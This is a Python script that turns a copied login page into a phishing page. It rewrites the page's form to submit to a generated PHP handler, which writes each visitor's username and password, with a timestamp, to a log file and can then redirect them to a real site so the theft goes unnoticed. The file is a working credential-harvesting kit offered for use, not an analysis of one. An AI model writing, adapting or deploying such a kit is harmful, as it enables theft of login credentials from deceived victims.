import os.path

from bs4 import BeautifulSoup

def index_php(f_user:str="username", f_pass:str="password", f_header:str=None):
    if f_header == None:
        index_php_no_header = f'''
        <?php
        $username = $_GET["{f_user}"];
        $password = $_GET["{f_pass}"];
        $date = date("d-m-y h:i:s");
        
        file_put_contents("logs.txt", "Date: " . $date . "\n", FILE_APPEND);
        file_put_contents("logs.txt", "Username: " . $username . "\n" , FILE_APPEND);
        file_put_contents("logs.txt", "Password: ". $password . "\n\n", FILE_APPEND);
        ?>
        '''

        with open("./Output/index.php", "w", encoding="utf-8") as with_header:
            with_header.write(index_php_no_header)
    else:
        index_php = f'''
        <?php
        $username = $_GET["{f_user}"];
        $password = $_GET["{f_pass}"];
        $date = date("d-m-y h:i:s");
        
        file_put_contents("logs.txt", "Date: " . $date . "\n", FILE_APPEND);
        file_put_contents("logs.txt", "Username: " . $username . "\n" , FILE_APPEND);
        file_put_contents("logs.txt", "Password: ". $password . "\n\n", FILE_APPEND);
        header("Location: {f_header}");
        ?>
        '''

        with open("./Output/index.php", "w", encoding="utf-8") as with_header:
            with_header.write(index_php)

def index_html(form_index:int=0, f_user:str="username", f_pass:str="password", f_header:str=None,):
    try:
        with open("./input.html", "r") as input:
            soup = BeautifulSoup(input.read(), "html.parser")

            form_tag = soup.find_all("form")[form_index]
            action_attr = form_tag["action"]
            method_attr = form_tag["method"]

            if action_attr == "./index.php":
                pass
            else:
                form_tag["action"] = "./index.php"

            if method_attr == "get":
                pass
            else:
                form_tag["method"] = "get"

            with open("./Output/index.html", "w", encoding="utf-8") as output:
                output.write(soup.prettify())

        index_php(f_user, f_pass, f_header)

        print('Finish! Saved on "Output" Folder')
    except:
        print("Something went wrong, Please try again...")

if __name__ == "__main__":
    if os.path.isdir("./Output"):
        pass
    else:
        os.makedirs("./Output")

    form_index = int(input("Form Index (Required): "))
    form_user = input("Username ID (Required): ")
    form_pass = input("Password ID (Required): ")
    form_header = input("Header (Optional): ")

    if form_index == str:
        print("Invalid index, Please try again...")
    else:
        if form_header == "":
            index_html(form_index, form_user, form_pass)
        else:
            index_html(form_index, form_user, form_pass, form_header)